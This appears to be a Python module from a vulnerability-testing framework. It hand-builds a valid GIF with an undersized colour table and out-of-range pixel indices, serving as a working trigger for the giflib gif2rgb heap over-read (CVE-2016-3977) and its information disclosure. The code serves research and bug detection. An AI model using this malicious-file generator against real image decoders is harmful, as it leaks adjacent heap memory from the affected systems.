"""Directed trigger for an INDEXED-TABLE over-read behind a container format (CWE-125 / CWE-200).

The shape, from giflib's gif2rgb (CVE-2016-3977 and its five re-files):

    ColorMapEntry = &ColorMap->Colors[GifRow[j]];   // gif2rgb.c:294 / :317

`GifRow[j]` is a pixel's colour index -- a byte, 0..255, chosen by the IMAGE DATA -- and
`ColorMap->Colors` has only `ColorCount` entries (often 2). A pixel index >= ColorCount reads
past the colour table and copies those bytes (adjacent heap) into the decoded RGB output: an
out-of-bounds READ that is also an information DISCLOSURE.

A blind fuzzer almost never constructs this: it has to keep a VALID GIF container -- magic, screen
descriptor, a colour table, a syntactically valid LZW image stream -- while making one decoded
pixel index exceed the table size, and random mutation breaks the container long before it lands
the index. But once a detector has NARROWED to the palette-index sink, the trigger is not a search
at all: build the smallest valid GIF whose table is tiny and whose one pixel is out of range. That
is what this module does -- one construction, no campaign -- so the narrowed sink becomes a
detonatable input the ASan build reports (L1) and the plain build turns into disclosure (L3, via
chain_primitive._oob_read_disclose: the leaked bytes are heap the palette never held).

Only the GIF container is implemented here; the mechanism (small table + out-of-range index in a
valid container) is the same for any palette/indexed format, and each one is a short addition.
"""
from __future__ import annotations

import struct

# ---------------------------------------------------------------- GIF89a, built by hand (no giflib)

_GIF_HEADER = b"GIF89a"
_TRAILER = b"\x3b"
_IMAGE_SEP = b"\x2c"


def _lzw_min8(pixels: list[int]) -> bytes:
    """A valid GIF LZW image data stream for `pixels`, min-code-size 8.

    Min code size 8 makes the clear code 256 and the end code 257, so every byte value 0..255 is
    a ROOT code emitted directly -- no dictionary building is needed to encode a given index, which
    is exactly what we want (we are placing a specific index, not compressing). Codes are packed
    LSB-first at 9 bits; the decoder widens its code size as it adds dictionary entries, so we keep
    the pixel count small enough (< ~250) that the width never leaves 9 bits and the stream stays
    unambiguous. Output is chunked into GIF sub-blocks (<=255 bytes, 0x00 terminator)."""
    assert all(0 <= p <= 255 for p in pixels)
    min_code_size = 8
    clear, end = 1 << min_code_size, (1 << min_code_size) + 1     # 256, 257
    code_size = min_code_size + 1                                 # 9
    next_code = end + 1                                           # 258
    bits, nbits = 0, 0
    out = bytearray()

    def emit(code: int) -> None:
        nonlocal bits, nbits
        bits |= code << nbits
        nbits += code_size
        while nbits >= 8:
            out.append(bits & 0xFF)
            bits >>= 8
            nbits -= 8

    emit(clear)
    for p in pixels:
        emit(p)
        next_code += 1
        # widen exactly when the next assignable code would not fit (bounded, 12 max); for our
        # small pixel counts this never fires, but keep the encoder honest.
        if next_code == (1 << code_size) and code_size < 12:
            code_size += 1
    emit(end)
    if nbits > 0:
        out.append(bits & 0xFF)

    # sub-block framing
    framed = bytearray()
    for i in range(0, len(out), 255):
        chunk = out[i:i + 255]
        framed.append(len(chunk))
        framed.extend(chunk)
    framed.append(0x00)          # block terminator
    return bytes(framed)


def gif_overindexed(*, colors: int = 2, index: int = 255, width: int = 8, height: int = 1,
                    palette: bytes | None = None) -> bytes:
    """A valid GIF89a whose global colour table has `colors` entries and whose decoded image is
    `width*height` pixels ALL equal to `index`. When `index >= colors`, a decoder that indexes the
    table by the pixel value reads past it.

    `colors` is rounded UP to the nearest power of two (a GIF table size is 2**(N+1)); the packed
    field encodes N. `palette`, if given, is the raw colour-table bytes (3*table_size) -- used to
    plant a recognisable pattern for the disclosure oracle; otherwise a minimal black/white table.
    """
    if not (0 <= index <= 255):
        raise ValueError("a GIF pixel index is one byte (0..255)")
    # table size = 2**(n+1), n in 0..7  -> 2,4,8,...,256 entries
    n = 0
    while (2 << n) < max(2, colors) and n < 7:
        n += 1
    table_size = 2 << n
    packed = 0x80 | (n & 0x07)        # bit7: GCT present; bits0-2: size exponent
    if palette is None:
        pal = bytearray()
        for k in range(table_size):
            v = 0 if k == 0 else 255
            pal += bytes((v, v, v))
        palette = bytes(pal)
    elif len(palette) != table_size * 3:
        raise ValueError(f"palette must be {table_size*3} bytes for a {table_size}-entry table")

    out = bytearray()
    out += _GIF_HEADER
    out += struct.pack("<HH", width, height)              # logical screen w,h
    out += bytes((packed, 0, 0))                          # packed, bg index, aspect
    out += palette                                        # global colour table
    out += _IMAGE_SEP
    out += struct.pack("<HH", 0, 0)                       # image left, top
    out += struct.pack("<HH", width, height)              # image w,h
    out += bytes((0x00,))                                 # image packed: no local table
    out += bytes((8,))                                    # LZW minimum code size
    out += _lzw_min8([index] * (width * height))          # image data
    out += _TRAILER
    return bytes(out)
